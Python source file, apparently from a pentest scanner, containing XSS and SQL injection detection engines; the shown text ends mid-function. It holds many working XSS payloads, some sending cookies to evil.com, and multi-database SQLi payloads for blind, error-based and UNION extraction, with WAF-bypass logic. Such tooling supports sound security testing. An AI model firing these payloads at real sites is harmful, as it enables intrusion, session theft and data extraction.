# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

# engines/web_engines.py
"""
合并 Web 漏洞引擎模块
功能：XSS、SQLi、LFI、CMDI、SSTI、NoSQL
修复 v2.1：
1. SQLi 指纹缓存优化
2. 时间盲注阈值增加网络 RTT 基线
3. 清理所有修复注释
"""

import re
import asyncio
import time
import random

from vulnclaw.core.logger import logger
from vulnclaw.core.settings import settings
from vulnclaw.core.utils import build_attack_url, async_get, obfuscate_payload
from vulnclaw.engines.base import BaseEngine, _parse_response
from typing import Dict, List, Optional, Tuple


# ============================================================
# XSSEngine
# ============================================================
class XSSEngine(BaseEngine):
    """XSS 检测引擎"""
    name = "xss"
    description = "XSS（跨站脚本）检测引擎"

    priority_params = [
        "q", "search", "query", "s", "keyword", "name", "text",
        "comment", "message", "content", "title", "tag", "category",
        "redirect", "return", "next", "url", "link", "ref", "source",
        "input", "data", "value", "filter", "page", "view"
    ]

    payloads = [
        ("<script>alert(1)</script>", "基础script标签"),
        ("<img src=x onerror=alert(1)>", "img事件"),
        ("<svg onload=alert(1)>", "svg事件"),
        ("<body onload=alert(1)>", "body事件"),
        ("<iframe src=javascript:alert(1)>", "iframe"),
        ("<a href=javascript:alert(1)>click</a>", "a标签"),
        ("'><script>alert(1)</script>", "单引号闭合"),
        ('"><script>alert(1)</script>', "双引号闭合"),
        ("</script><script>alert(1)</script>", "提前闭合script"),
        ("';alert(1);//", "分号闭合"),
        ('";alert(1);//', "双引号分号"),
        ("'})alert(1)//", "括号闭合"),
        ("'><img src=x onerror=alert(1)>", "闭合+img"),
        ("<ScRiPt>alert(1)</ScRiPt>", "大小写script"),
        ("<IMG SRC=x OnErRoR=alert(1)>", "大小写事件"),
        ("<svg/onload=alert(1)>", "无空格绕过"),
        ("%3Cscript%3Ealert(1)%3C/script%3E", "URL编码script"),
        ("%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "URL编码img"),
        ("&lt;script&gt;alert(1)&lt;/script&gt;", "HTML实体"),
        ("&#60;script&#62;alert(1)&#60;/script&#62;", "十进制编码"),
        ("<div onmouseover=alert(1)>hover</div>", "鼠标悬停"),
        ("<input onfocus=alert(1) autofocus>", "自动聚焦"),
        ("<details ontoggle=alert(1)>", "details事件"),
        ("<marquee onstart=alert(1)>", "marquee事件"),
        ("<video src=x onerror=alert(1)>", "video事件"),
        ("<audio src=x onerror=alert(1)>", "audio事件"),
        ("javascript:alert(1)", "javascript伪协议"),
        ("data:text/html,<script>alert(1)</script>", "data伪协议"),
        ("<script>eval('alert(1)')</script>", "eval混淆"),
        ("<script>alert`1`</script>", "模板字符串"),
        ("<script>/*alert(1)*/</script>", "多行注释"),
        ("<script>alert(1)//</script>", "注释绕过"),
        ("<script>alert(1)</script><!--", "HTML注释"),
        ("<script>document.write(1)</script>", "document.write"),
        ("<img src=x onerror=this.constructor.constructor('alert(1)')()>", "constructor绕过"),
        ("<svg/onload=this.constructor.constructor`alert(1)```>", "反引号绕过"),
        ("<img src=x onerror=alert`1`>", "模板字符串事件"),
        ("<img src=x onerror=alert(1)//", "注释+img"),
        ('" onmouseover=alert(1) "', "属性注入"),
        ("' onfocus=alert(1) autofocus", "焦点注入"),
        ('" onclick=alert(1) "', "点击注入"),
        ("<svg><script>alert(1)</script>", "svg内script"),
        ("<math><script>alert(1)</script>", "math内script"),
        ("<details/open/ontoggle=alert`1`>", "details无空格"),
        ("<video/src=1/onerror=alert`1`>", "video无空格"),
        ("<audio/src=1/onerror=alert`1`>", "audio无空格"),
        ("<marquee/onstart=alert`1`>", "marquee无空格"),
        ("<body/onload=alert`1`>", "body无空格"),
        ("<iframe/src=javascript:alert`1`>", "iframe无空格"),
        ("<a/href=javascript:alert`1`>click", "a标签无空格"),
        ("<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", "charCode绕过"),
        ("<script>eval(atob('YWxlcnQoMSk='))</script>", "base64绕过"),
        ("<img src=x onerror=prompt(1)>", "prompt"),
        ("<img src=x onerror=confirm(1)>", "confirm"),
        ("<img src=x onerror=document.cookie>", "cookie窃取"),
        ("<img src=x onerror=fetch('http://evil.com?c='+document.cookie)>", "外带cookie"),
        ("<script>fetch('http://evil.com?c='+document.cookie)</script>", "外带cookie2"),
        ("<script>new Image().src='http://evil.com?c='+document.cookie</script>", "Image外带"),
    ]

    DOM_XSS_PATTERNS = [
        r'document\.write\s*\(',
        r'document\.writeln\s*\(',
        r'innerHTML\s*=',
        r'outerHTML\s*=',
        r'eval\s*\(',
        r'setTimeout\s*\([^,]+,\s*\d+\)',
        r'setInterval\s*\([^,]+,\s*\d+\)',
        r'location\.hash',
        r'location\.search',
        r'document\.URL',
        r'document\.documentURI',
        r'\.innerHTML\s*\+\s*=',
        r'createElement\s*\(',
        r'appendChild\s*\(',
        r'insertAdjacentHTML\s*\(',
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if normal_resp is None or not isinstance(normal_resp, tuple) or len(normal_resp) < 2:
            try:
                resp = await async_get(url, session=session, timeout=5, no_retry=True)
                if isinstance(resp, tuple) and len(resp) >= 2:
                    normal_resp = (resp[0], resp[1] if resp[1] else "", resp[2] if len(resp) > 2 else {})
                else:
                    return None
            except BaseException:
                return None

        if isinstance(normal_resp, tuple):
            _normal_status, _normal_text = normal_resp[0], normal_resp[1]
        else:
            _normal_status, _normal_text = normal_resp.status, await normal_resp.text()

        compliant = kwargs.get('compliant', False)
        is_static = kwargs.get('is_static', False)

        if not await self._is_param_reflected(url, param, normal_resp, parsed_query, session):
            self.log_debug(f"参数 {param} 无反射，跳过 XSS 检测")
            return None

        payloads = self.reorder_payloads_by_param(param)
        if is_static:
            payloads = payloads[:5]

        for payload, desc in payloads:
            if not is_static and self.enable_obfuscation and random.random() > 0.3:
                try:
                    mutated = obfuscate_payload(payload)
                    if mutated != payload:
                        result = await self._test_xss_payload(
                            url, param, mutated, f"{desc}(混淆)",
                            normal_resp, parsed_query, session
                        )
                        if result:
                            return result
                except BaseException:
                    logger.debug("suppressed exception (engine audit)")

            result = await self._test_xss_payload(
                url, param, payload, desc,
                normal_resp, parsed_query, session
            )
            if result:
                return result

            if compliant:
                await asyncio.sleep(0.2)

        return None

    async def _test_xss_payload(
        self,
        url: str,
        param: str,
        payload: str,
        desc: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session
    ) -> Optional[Dict]:
        normal_resp[1] if isinstance(normal_resp, tuple) else await normal_resp.text()
        attack_url = build_attack_url(url, param, payload, parsed_query)

        try:
            attack_resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)

            if isinstance(attack_resp, tuple):
                attack_status, attack_text = attack_resp[0], attack_resp[1]
            else:
                attack_status, attack_text = attack_resp.status, await attack_resp.text()

            if attack_status in (403, 406) and len(attack_text) < 100:
                self.log_debug(f"检测到 WAF 阻断 (状态码 {attack_status})，尝试绕过...")
                waf_type = "unknown"
                bypass_result = await self.try_waf_bypass(
                    url, param, payload, parsed_query, session,
                    waf_type, normal_resp
                )
                if bypass_result:
                    return bypass_result
                return None

            waf_type = await self.detect_waf(attack_text)
            if waf_type:
                self.log_debug(f"检测到 WAF ({waf_type})，尝试绕过...")
                bypass_result = await self.try_waf_bypass(
                    url, param, payload, parsed_query, session,
                    waf_type, normal_resp
                )
                if bypass_result:
                    return bypass_result
                return None

            if self._is_xss_reflected(attack_text, payload):
                evidence = self._extract_reflected_evidence(attack_text, payload)
                result = {
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'type': f'XSS-反射型({desc})',
                    'severity': 'High',
                    'ai_verdict': '高',
                    'confidence': 'high',
                    'evidence': evidence,
                    'diff_ratio': 0.5,
                }
                if await self._verify_xss_browser(attack_url):
                    result['browser_verified'] = True
                    result['severity'] = 'Critical'
                    result['evidence'] += "；浏览器执行验证命中（弹窗/事件触发），已确认可执行"
                    result['ai_verdict'] = '极高'
                return result

            if self._has_js_execution(attack_text):
                return {
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'type': f'XSS-JS执行({desc})',
                    'severity': 'Medium',
                    'ai_verdict': '中',
                    'confidence': 'medium',
                    'evidence': f"检测到JS执行特征: {self._extract_js_evidence(attack_text)}",
                }

            has_diff, diff_ratio = self.has_response_diff(
                normal_resp,
                (attack_status, self.strip_payload_reflection(attack_text, payload), {}),
                threshold=0.2
            )
            if has_diff and len(attack_text) > 100:
                return {
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'type': f'XSS-疑似({desc})',
                    'severity': 'Low',
                    'ai_verdict': '低（仅长度异常）',
                    'confidence': 'low',
                    'evidence': f"响应长度异常变化 {diff_ratio:.1%}",
                    'diff_ratio': diff_ratio
                }

        except Exception as e:
            self.log_debug(f"XSS 检测异常 {param}: {e}")

        return None

    async def _verify_xss_browser(self, attack_url: str) -> bool:
        """A1 XSS 浏览器执行验证：用 headless 加载 PoC，监听 alert/confirm/prompt 弹窗，
        命中即确认该注入点真正可执行（而非仅字符串反射）。playwright 不可用时返回 False，
        不改变原"反射型"结论（安全降级）。
        """
        if not getattr(settings, 'xss_browser_verify', True):
            return False
        try:
            from playwright.async_api import async_playwright
        except ImportError:
            return False  # 浏览器不可用，不降级原结论

        timeout = getattr(settings, 'xss_browser_timeout', 15)
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()
                dialog_fired = asyncio.Event()
                async def _on_dialog(dialog):
                    dialog_fired.set()
                    try:
                        await dialog.dismiss()
                    except BaseException:
                        logger.debug("suppressed exception (engine audit)")
                page.on("dialog", _on_dialog)
                try:
                    await page.goto(attack_url, timeout=timeout * 1000, wait_until="domcontentloaded")
                except BaseException:
                    logger.debug("suppressed exception (engine audit)")
                try:
                    await page.wait_for_event("dialog", timeout=2000)
                except BaseException:
                    logger.debug("suppressed exception (engine audit)")
                verified = dialog_fired.is_set()
                await browser.close()
                return verified
        except Exception as e:
            self.log_debug(f"XSS 浏览器验证异常: {e}")
            return False

    async def _is_param_reflected(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session
    ) -> bool:
        test_payload = f"test_reflect_{random.randint(1000, 9999)}"
        test_url = build_attack_url(url, param, test_payload, parsed_query)

        try:
            resp = await async_get(test_url, session=session, timeout=5, no_retry=True)
            if isinstance(resp, tuple):
                text = resp[1]
            else:
                text = await resp.text()

            if test_payload in text:
                return True

            encoded_variants = [
                test_payload,
                test_payload.replace('_', '%5F'),
                test_payload.replace('_', '&#95;'),
            ]
            for variant in encoded_variants:
                if variant in text:
                    return True

            return False
        except BaseException:
            return True

    def _is_xss_reflected(self, text: str, payload: str) -> bool:
        clean_payload = payload.replace('<', '').replace('>', '').replace('"', '').replace("'", '')
        if len(clean_payload) < 5:
            return False

        key_indicators = []
        if 'alert' in payload.lower():
            key_indicators.append('alert')
        if 'script' in payload.lower():
            key_indicators.append('script')
        if 'onerror' in payload.lower():
            key_indicators.append('onerror')
        if 'onload' in payload.lower():
            key_indicators.append('onload')
        if 'onmouseover' in payload.lower():
            key_indicators.append('onmouseover')
        if 'javascript:' in payload.lower():
            key_indicators.append('javascript:')
        if 'eval' in payload.lower():
            key_indicators.append('eval')
        if 'prompt' in payload.lower():
            key_indicators.append('prompt')
        if 'confirm' in payload.lower():
            key_indicators.append('confirm')

        text_lower = text.lower()
        for indicator in key_indicators:
            if indicator in text_lower:
                return True

        encoded_payloads = [
            payload,
            payload.replace('<', '&lt;'),
            payload.replace('>', '&gt;'),
            payload.replace('"', '&quot;'),
            payload.replace("'", '&#39;'),
        ]
        for encoded in encoded_payloads:
            if encoded in text:
                return True

        return False

    def _extract_reflected_evidence(self, text: str, payload: str) -> str:
        for part in ['alert', 'script', 'onerror', 'onload', 'onmouseover', 'prompt', 'confirm']:
            if part in text:
                idx = text.find(part)
                if idx != -1:
                    start = max(0, idx - 30)
                    end = min(len(text), idx + 60)
                    return text[start:end]

        for encoded in [payload, payload.replace('<', '&lt;')]:
            if encoded in text:
                idx = text.find(encoded)
                if idx != -1:
                    start = max(0, idx - 20)
                    end = min(len(text), idx + len(encoded) + 20)
                    return text[start:end]

        return "检测到 XSS 反射特征"

    def _has_js_execution(self, text: str) -> bool:
        js_patterns = [
            r'alert\s*\(', r'confirm\s*\(', r'prompt\s*\(',
            r'console\.log', r'document\.write',
            r'eval\s*\(', r'Function\s*\(', r'setTimeout\s*\(',
            r'setInterval\s*\(', r'<script>', r'</script>',
            r'onerror\s*=', r'onload\s*=', r'onclick\s*=',
            r'onmouseover\s*=', r'onfocus\s*=',
            r'javascript:', r'vbscript:',
            r'constructor\.constructor',
            r'\.innerHTML\s*=', r'\.outerHTML\s*=',
            r'atob\s*\(', r'btoa\s*\(',
        ]
        return any(re.search(pattern, text, re.I) for pattern in js_patterns)

    def _extract_js_evidence(self, text: str) -> str:
        patterns = ['alert', 'confirm', 'prompt', 'eval', 'Function', 'document.write', 'innerHTML']
        for p in patterns:
            if p in text.lower():
                idx = text.lower().find(p)
                if idx != -1:
                    start = max(0, idx - 20)
                    end = min(len(text), idx + 50)
                    return text[start:end]
        return "检测到JS执行特征"

    async def detect_dom_xss(
        self,
        url: str,
        html_content: str,
        session
    ) -> List[Dict]:
        findings = []
        if not html_content:
            return findings

        js_code = self._extract_js_from_html(html_content)
        if not js_code:
            return findings

        for pattern in self.DOM_XSS_PATTERNS:
            matches = re.findall(pattern, js_code, re.I)
            if matches:
                findings.append({
                    'url': url,
                    'type': 'XSS-DOM型',
                    'ai_verdict': '中',
                    'evidence': f"检测到 DOM XSS 特征: {pattern}",
                    'matches': matches[:3],
                    'severity': 'High',
                    'suggestion': '建议手动审查 JS 代码中用户输入的使用方式'
                })

        dangerous_funcs = [
            'eval', 'setTimeout', 'setInterval', 'Function',
            'document.write', 'document.writeln', 'innerHTML',
            'outerHTML', 'insertAdjacentHTML', 'appendChild',
            'createElement'
        ]
        for func in dangerous_funcs:
            if func in js_code:
                if self._has_user_input_flow(js_code, func):
                    findings.append({
                        'url': url,
                        'type': f'XSS-DOM型({func})',
                        'ai_verdict': '高',
                        'evidence': f"危险函数 {func}() 可能接收用户输入",
                        'severity': 'High'
                    })

        return findings

    def _extract_js_from_html(self, html: str) -> str:
        js_parts = []
        script_pattern = r'<script[^>]*>(.*?)</script>'
        matches = re.findall(script_pattern, html, re.DOTALL | re.I)
        js_parts.extend(matches)

        event_pattern = r'on[a-z]+\s*=\s*["\']([^"\']+)["\']'
        matches = re.findall(event_pattern, html, re.I)
        js_parts.extend(matches)

        pseudo_pattern = r'javascript:([^"\'\s>]+)'
        matches = re.findall(pseudo_pattern, html, re.I)
        js_parts.extend(matches)

        return ' '.join(js_parts)

    def _has_user_input_flow(self, js_code: str, func: str) -> bool:
        func_calls = re.findall(rf'{func}\s*\(([^)]*)\)', js_code, re.I)
        user_input_sources = [
            r'location\.', r'document\.URL', r'document\.documentURI',
            r'location\.hash', r'location\.search', r'location\.pathname',
            r'window\.name', r'document\.referrer', r'document\.cookie',
            r'localStorage\.', r'sessionStorage\.',
            r'getElementById', r'getElementsBy', r'querySelector',
            r'\.value', r'\.innerHTML', r'\.outerHTML',
            r'\.textContent', r'\.innerText',
        ]
        for call in func_calls:
            for source in user_input_sources:
                if re.search(source, call, re.I):
                    return True
        return False


# ============================================================
# SQLiEngine（修复：指纹缓存 + 时间盲注基线）
# ============================================================
class SQLiEngine(BaseEngine):
    """SQL注入检测引擎 - 修复版 v3.1"""

    name = "sqli"
    description = "SQL注入检测引擎 (修复版)"

    priority_params = ["id", "user", "uid", "page", "sort", "order", "cat",
                       "cid", "product", "item", "post", "news", "article",
                       "query", "search", "filter", "where", "group", "by",
                       "having", "limit", "offset", "name", "email"]

    FINGERPRINT_CACHE_TTL = 300
    NORMAL_RESP_REFRESH_INTERVAL = 60
    SQL_PARAM_BLACKLIST = ("nreum", "newrelic")
    # 高辨识度 SQL 报错短语；仅这些才判为报错，避免把页面里 "SQL Injection" 链接、
    # 数据库名提及等静态内容误判（曾导致 DVWA 首页刷 11 条报错注入误报）。
    SQL_ERROR_PHRASES = (
        "you have an error in your sql syntax",
        "sql syntax error",
        "unclosed quotation mark",
        "microsoft ole db provider",
        "ole db provider for odbc",
        "sqlstate",
        "ora-",
        "sqlcode",
        "mysql_fetch",
        "mysqli_query",
        "mysqli_fetch",
        "pg_query",
        "psql: error",
        "warning: mysql",
        "native error",
        "invalid query",
        "mysql server has gone away",
        "odbc driver",
        "db2 sql error",
        # SQLite / 通用报错特征（Python/PHP/Node 应用大量使用 SQLite，原短语表漏覆盖）
        "sqlite error",
        "sqlite3.operationalerror",
        "sqlite_exception",
        "near \"",
        "unterminated string literal",
        "syntax error near",
        "ambiguous column",
    )

    def __init__(self):
        super().__init__()
        self._fingerprint_cache: Dict[str, Tuple[str, float]] = {}
        self._cache_lock = asyncio.Lock()
        self._normal_resp_cache: Dict[str, Tuple[Tuple[int, str, Dict], float]] = {}
        self._normal_resp_lock = asyncio.Lock()
        logger.info(f"🔍 SQLi 指纹缓存 TTL: {self.FINGERPRINT_CACHE_TTL}s, 基线刷新间隔: {self.NORMAL_RESP_REFRESH_INTERVAL}s")

    DATABASE_FINGERPRINTS = {
        "MySQL": {"version": "SELECT @@version", "database": "SELECT database()", "user": "SELECT user()", "concat": "CONCAT", "comment": "-- ", "stacked": True},
        "PostgreSQL": {"version": "SELECT version()", "database": "SELECT current_database()", "user": "SELECT current_user", "concat": "||", "comment": "-- ", "stacked": True},
        "Oracle": {"version": "SELECT banner FROM v$version", "database": "SELECT sys_context('userenv','db_name') FROM dual", "user": "SELECT user FROM dual", "concat": "||", "comment": "--", "stacked": False},
        "SQL Server": {"version": "SELECT @@version", "database": "SELECT DB_NAME()", "user": "SELECT SYSTEM_USER", "concat": "+", "comment": "--", "stacked": True},
        "SQLite": {"version": "SELECT sqlite_version()", "database": "SELECT file", "user": "SELECT 'sqlite'", "concat": "||", "comment": "--", "stacked": False}
    }

    COMMON_PAYLOADS = [
        ("' OR '1'='1", "经典布尔绕过"),
        ("' OR 1=1#", "MySQL注释绕过"),
        ("' OR 1=1-- -", "PostgreSQL注释"),
        ("' OR 1=1/*", "Oracle注释"),
        ("1' AND '1'='1", "闭合绕过"),
        ("1' AND '1'='2", "布尔对比"),
        ("1' AND 1=1#", "数字布尔"),
        ("1' AND 1=2#", "数字布尔对比"),
        ("'", "单引号探测"),
        ('"', "双引号探测"),
        ("1'", "数字+单引号"),
    ]

    MYSQL_PAYLOADS = [
        ("1' AND SLEEP(5)--", "MySQL时间盲注(5s)"),
        ("' OR SLEEP(5)#", "MySQL时间盲注变体"),
        ("1' AND extractvalue(1,concat(0x7e,version()))--", "MySQL报错注入"),
        ("1' AND updatexml(1,concat(0x7e,version()),1)--", "MySQL报错注入"),
        ("1' UNION SELECT NULL--", "UNION探测列数"),
        ("1' UNION SELECT NULL,NULL--", "UNION两列"),
        ("1' UNION SELECT NULL,NULL,NULL--", "UNION三列"),
        ("1' UNION SELECT NULL,NULL,NULL,NULL--", "UNION四列"),
        ("1' UNION SELECT @@version--", "UNION获取版本"),
        ("1' UNION SELECT database()--", "UNION获取数据库"),
        ("1' UNION SELECT user()--", "UNION获取用户"),
        ("1'/**/OR/**/'1'='1", "注释绕过"),
        ("1'%0AOR%0A'1'='1", "换行绕过"),
        ("1'||'1'='1", "字符串拼接"),
    ]

    POSTGRESQL_PAYLOADS = [
        ("1' AND pg_sleep(5)--", "PostgreSQL时间盲注"),
        ("1' AND 1=CAST(version() AS int)--", "PostgreSQL报错"),
        ("1' UNION SELECT NULL,version()--", "UNION版本"),
        ("1' UNION SELECT NULL,current_database()--", "UNION数据库"),
    ]

    ORACLE_PAYLOADS = [
        ("1' AND DBMS_LOCK.SLEEP(5)--", "Oracle时间盲注"),
        ("1' AND 1=dbms_pipe.receive_message('R',5)--", "Oracle时间盲注"),
        ("1' UNION SELECT NULL,version() FROM dual--", "UNION版本"),
        ("1' UNION SELECT NULL,user() FROM dual--", "UNION用户"),
    ]

    MSSQL_PAYLOADS = [
        ("1' WAITFOR DELAY '0:0:5'--", "MSSQL时间盲注"),
        ("1' AND 1=CONVERT(int,@@version)--", "MSSQL报错注入"),
        ("1' UNION SELECT NULL,@@version--", "UNION版本"),
        ("1' UNION SELECT NULL,DB_NAME()--", "UNION数据库"),
    ]

    def _get_payloads_for_db(self, db_type: str, param: str = None, max_count: int = None) -> List[Tuple[str, str]]:
        if max_count is None:
            max_count = self.max_payloads

        all_payloads = self.COMMON_PAYLOADS.copy()

        if db_type == "MySQL":
            all_payloads.extend(self.MYSQL_PAYLOADS)
        elif db_type == "PostgreSQL":
            all_payloads.extend(self.POSTGRESQL_PAYLOADS)
        elif db_type == "Oracle":
            all_payloads.extend(self.ORACLE_PAYLOADS)
        elif db_type == "SQL Server":
            all_payloads.extend(self.MSSQL_PAYLOADS)
        else:
            all_payloads.extend(self.MYSQL_PAYLOADS)
            all_payloads.extend(self.POSTGRESQL_PAYLOADS)
            all_payloads.extend(self.ORACLE_PAYLOADS)
            all_payloads.extend(self.MSSQL_PAYLOADS)

        seen = set()
        unique = []
        for p, d in all_payloads:
            if p not in seen:
                seen.add(p)
                unique.append((p, d))

        if param:
            param_lower = param.lower()
            matched = []
            unmatched = []
            for p, d in unique:
                if param_lower in p.lower() or any(kw in d.lower() for kw in ['id', 'user', 'uid']):
                    matched.append((p, d))
                else:
                    unmatched.append((p, d))
            unique = matched + unmatched

        return unique[:max_count]

    async def _get_fresh_normal_response(self, url: str, session) -> Optional[Tuple[int, str, Dict]]:
        try:
            resp = await async_get(url, session=session, timeout=10, no_retry=True)
            if isinstance(resp, tuple) and len(resp) >= 2:
                status = resp[0]
                text = resp[1] if resp[1] else ""
                headers = resp[2] if len(resp) > 2 else {}
                if status in (200, 301, 302, 307):
                    return (status, text, headers)
                else:
                    return (200, "", {})
        except Exception as e:
            logger.debug(f"获取正常响应失败: {e}")
        return None

    async def _get_normal_response(self, url: str, session, force_refresh: bool = False) -> Tuple[int, str, Dict]:
        async with self._normal_resp_lock:
            now = time.time()
            if url in self._normal_resp_cache and not force_refresh:
                cached_resp, timestamp = self._normal_resp_cache[url]
                if now - timestamp < self.NORMAL_RESP_REFRESH_INTERVAL:
                    return cached_resp

        fresh = await self._get_fresh_normal_response(url, session)
        if fresh:
            async with self._normal_resp_lock:
                self._normal_resp_cache[url] = (fresh, time.time())
            return fresh

        return (200, "", {})

    async def _fingerprint_db(
        self,
        url: str,
        param: str,
        parsed_query: str,
        session
    ) -> Tuple[str, bool]:
        """指纹识别数据库类型 - 修复：增加缓存检查"""
        cache_key = f"{url}_{param}"

        async with self._cache_lock:
            if cache_key in self._fingerprint_cache:
                db_type, timestamp = self._fingerprint_cache[cache_key]
                if time.time() - timestamp < self.FINGERPRINT_CACHE_TTL:
                    return db_type, True

        normal = await self._get_normal_response(url, session)
        normal_status, normal_text = normal[0], normal[1]
        normal_len = len(normal_text)

        finger_payloads = [
            ("' AND 1=1-- ", ["MySQL", "PostgreSQL", "SQL Server"]),
            ("' AND 1=1-- -", ["PostgreSQL"]),
            ("' AND 1=1#", ["MySQL"]),
            ("' AND 1=1/*", ["Oracle"]),
            ("' AND 1=1--", ["SQL Server"]),
            ("' OR 1=1--", ["MySQL", "PostgreSQL", "SQL Server"]),
        ]

        for fp_payload, possible_dbs in finger_payloads:
            try:
                test_url = build_attack_url(url, param, fp_payload, parsed_query)
                resp = await async_get(test_url, session=session, timeout=5, no_retry=True)
                if isinstance(resp, tuple) and len(resp) >= 2:
                    status, text = resp[0], resp[1] if resp[1] else ""
                else:
                    continue

                if status == normal_status and abs(len(text) - normal_len) < 50:
                    error_payloads = {
                        "MySQL": "1' AND extractvalue(1,concat(0x7e,version()))-- ",
                        "PostgreSQL": "1' AND 1=CAST(version() AS int)-- ",
                        "Oracle": "1' AND 1=ctxsys.drithsx.sn(1,version())-- ",
                        "SQL Server": "1' AND 1=CONVERT(int,@@version)-- ",
                    }
                    for db_type, err_payload in error_payloads.items():
                        if db_type not in possible_dbs:
                            continue
                        err_url = build_attack_url(url, param, err_payload, parsed_query)
                        err_resp = await async_get(err_url, session=session, timeout=5, no_retry=True)
                        if isinstance(err_resp, tuple) and len(err_resp) >= 2:
                            err_text = err_resp[1] if err_resp[1] else ""
                        else:
                            continue
                        if "SQL" in err_text or "syntax" in err_text or db_type.lower() in err_text.lower():
                            async with self._cache_lock:
                                self._fingerprint_cache[cache_key] = (db_type, time.time())
                            logger.info(f"[{self.name}] 识别数据库: {db_type}")
                            return db_type, True
            except BaseException:
                logger.debug("suppressed exception (engine audit)")

        logger.debug(f"[{self.name}] 数据库指纹识别失败，返回 Unknown")
        return "Unknown", False

    def _matched_sql_error_phrases(self, text: str):
        """返回响应中命中的报错短语列表（空即无）。仅匹配高辨识度短语。"""
        if not text:
            return []
        tl = text.lower()
        return [p for p in self.SQL_ERROR_PHRASES if p in tl]

    def _has_sql_error(self, text: str) -> bool:
        return bool(self._matched_sql_error_phrases(text))

    def _extract_sql_error(self, text: str) -> str:
        if not text:
            return ""
        patterns = [
            r'SQL syntax.*?([^<"\n]{20,})',
            r'ERROR.*?([^<"\n]{20,})',
            r'Exception.*?([^<"\n]{20,})',
            r'ORA-[0-9]{5}.*?([^<"\n]{20,})',
            r'SQLSTATE.*?([^<"\n]{20,})',
            r'Warning.*?([^<"\n]{20,})',
            r'PostgreSQL.*?ERROR.*?([^<"\n]{20,})',
        ]
        for pattern in patterns:
            match = re.search(pattern, text, re.I)
            if match:
                return match.group(1).strip()[:100]
        lines = text.split('\n')
        for line in lines:
            if any(kw in line.lower() for kw in ['sql', 'error', 'exception', 'warning', 'mysql', 'postgres', 'oracle']):
                return line.strip()[:100]
        return "检测到 SQL 错误特征"

    def _generate_reverse_payload(self, payload: str) -> Optional[str]:
        for pattern, replacement in [
            ("OR '1'='1", "OR '1'='2"),
            ("OR 1=1", "OR 1=2"),
            ("AND '1'='1", "AND '1'='2"),
            ("AND 1=1", "AND 1=2"),
            ("SLEEP(5)", "SLEEP(0)"),
            ("pg_sleep(5)", "pg_sleep(0)"),
            ("WAITFOR DELAY '0:0:5'", "WAITFOR DELAY '0:0:0'"),
            ("UNION SELECT", "UNION SELECT NULL WHERE 1=2"),
        ]:
            if pattern in payload:
                return payload.replace(pattern, replacement)

        if "'" in payload or '"' in payload:
            digits = re.findall(r'\d+', payload)
            if digits:
                last = digits[-1]
                try:
                    new_val = str(int(last) + 1 if last.isdigit() else 1)
                    return payload.replace(last, new_val, -1)
                except BaseException:
                    logger.debug("suppressed exception (engine audit)")
        # 准确率修复：无法构造"真逆"时返回 None，而不是返回 "'"。
        # 旧版对单引号/双引号探测 payload 返回 "'" 作 B 样本，A/B 变成
        # '"' vs "'" 两种不同语法探测——回显/报错型目标（httpbin）天然不同，
        # 布尔盲注 A/B 验证因此大量假阳性。返回 None 后调用方跳过 A/B，
        # 仅在差异足够大（>30%）时报"疑似"，不再声称"验证通过"。
        return None

    async def _verify_time_based(
        self,
        url: str,
        param: str,
        payload_sleep: str,
        payload_no_sleep: str,
        parsed_query: str,
        session,
        sleep_seconds: int = 5
    ) -> Tuple[bool, float]:
        """验证时间盲注 - 修复：增加网络 RTT 基线"""
        baseline_start = time.time()
        try:
            await async_get(url, session=session, timeout=3, no_retry=True)
            baseline_rtt = time.time() - baseline_start
        except BaseException:
            baseline_rtt = 0.5

        threshold = baseline_rtt + 2.0

        url_sleep = build_attack_url(url, param, payload_sleep, parsed_query)
        url_no_sleep = build_attack_url(url, param, payload_no_sleep, parsed_query)

        try:
            start_sleep = time.time()
            await async_get(url_sleep, session=session, timeout=sleep_seconds + 5, no_retry=True)
            elapsed_sleep = time.time() - start_sleep

            start_no_sleep = time.time()
            resp_no_sleep = await async_get(url_no_sleep, session=session, timeout=10, no_retry=True)
            elapsed_no_sleep = time.time() - start_no_sleep

            diff = elapsed_sleep - elapsed_no_sleep
            if diff > threshold:
                return True, diff
            return False, diff

        except asyncio.TimeoutError:
            try:
                resp_no_sleep = await async_get(url_no_sleep, session=session, timeout=5, no_retry=True)
                if isinstance(resp_no_sleep, tuple) and resp_no_sleep[0] != 0:
                    return True, float(sleep_seconds + 2)
            except BaseException:
                logger.debug("suppressed exception (engine audit)")
            return False, 0.0
        except Exception as e:
            logger.debug(f"时间盲注验证异常: {e}")
            return False, 0.0

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        response_text = normal_resp[1] if isinstance(normal_resp, tuple) and len(normal_resp) > 1 else ""
        target_lower = f"{url} {param} {response_text}".lower()
        if any(item in target_lower for item in self.SQL_PARAM_BLACKLIST):
            self.log_debug(f"参数/响应包含监控特征，跳过 SQLi 检测: {param}")
            return None

        if normal_resp is None or not isinstance(normal_resp, tuple) or len(normal_resp) < 2:
            try:
                resp = await async_get(url, session=session, timeout=5, no_retry=True)
                if isinstance(resp, tuple) and len(resp) >= 2:
                    normal_resp = (resp[0], resp[1] if resp[1] else "", resp[2] if len(resp) > 2 else {})
                else:
                    return None
            except BaseException:
                return None

        _normal_status, _normal_text = normal_resp[0], normal_resp[1] if normal_resp[1] else ""

        if not await self.probe_param(url, param, parsed_query, session):
            self.log_debug(f"参数 {param} 无响应特征，跳过")
            return None

        db_type, db_identified = await self._fingerprint_db(url, param, parsed_query, session)
        if not db_identified:
